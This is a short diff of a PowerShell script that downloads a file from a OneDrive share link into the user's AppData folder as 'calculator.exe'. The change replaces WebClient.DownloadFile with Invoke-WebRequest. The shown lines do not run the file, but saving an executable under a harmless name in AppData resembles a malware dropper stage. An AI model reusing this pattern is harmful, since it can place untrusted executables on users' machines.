@@ -4,10 +4,10 @@ $WebFile = "https://1drv.ms/u/c/0ac10981c8ac3a80/EQQZI2VaN3pBis3h2Jom1w8B2Xd5HMw
 # Define the destination path for the downloaded file
 $destination = "$env:APPDATA\calculator.exe"
 
-# Download the file
+# Download the file using Invoke-WebRequest
 try {
     Write-Host "Downloading file from $WebFile..."
-    (New-Object System.Net.WebClient).DownloadFile($WebFile, $destination)
+    Invoke-WebRequest -Uri $WebFile -OutFile $destination
     Write-Host "File downloaded successfully to $destination."
 } catch {
     Write-Host "Failed to download file: $_"
